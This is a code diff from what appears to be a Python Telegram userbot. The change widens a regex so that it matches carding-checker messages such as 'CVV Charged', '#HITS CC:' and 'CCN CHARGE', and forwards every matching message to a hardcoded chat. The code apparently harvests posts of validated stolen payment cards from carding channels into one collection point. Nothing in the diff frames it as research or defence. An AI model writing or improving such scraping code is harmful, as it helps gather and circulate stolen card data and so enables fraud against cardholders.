@@ -181,10 +181,10 @@ async def sk_find_all(client, m):
           
 # Assuming check is a valid regular expression pattern (string)
 
-check = r"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅|𝘾𝙝𝙖𝙧𝙜𝙚𝙙|Charged"
+check = r"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅|𝘾𝙝𝙖𝙧𝙜𝙚𝙙|Charged|Succeeded|𝗖𝗵𝗮𝗿𝗴𝗲|Approved|#CHARGED|#LIVE|$1 CVV Charged|𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ✅|CHARGED : 1$ ✅|#HITS CC:|Payment Success ✅|CHARGED ✅|𝘾𝙃𝘼𝙍𝙂𝙀𝘿 𝘾𝘾:|CCN CHARGE"
 @user.on_message(filters.regex(check))
 async def check_find_all(client, m):
-    print(m)
+    
     msg = m.text
     await bot.send_message(chat_id=-1001806749111, text=msg)
 
